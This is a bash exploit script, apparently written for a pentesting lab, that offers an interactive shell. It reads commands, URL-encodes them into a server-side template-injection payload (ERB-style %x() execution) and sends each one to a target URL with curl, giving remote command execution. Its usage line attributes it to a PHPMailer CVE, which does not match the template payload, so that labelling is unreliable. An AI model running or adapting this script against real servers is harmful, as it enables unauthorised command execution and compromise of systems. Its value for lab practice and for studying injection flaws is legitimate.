#!/bin/bash

#Example : https://ptl-d0e42ebe-403af868.libcurl.so/pages?id%5Binline%5D=

if [ $# -eq 0 ]; then
    echo "Usage: ./CVE-2016-10033_PHPMailer.sh [target]/vuln_endpoint="
    exit 1
fi

while IFS= read -r -p "Enter command to execute: " cmd; do
    encoded_cmd=$(printf '%s' "$cmd" | jq -sRr @uri)
    final_payload=$(printf '%%3C%%25=%%20%%25x(%s)%%20%%25%%3E%%0A' "$encoded_cmd")
    echo "Payload = $1${final_payload}"
    curl "$1${final_payload}"
done
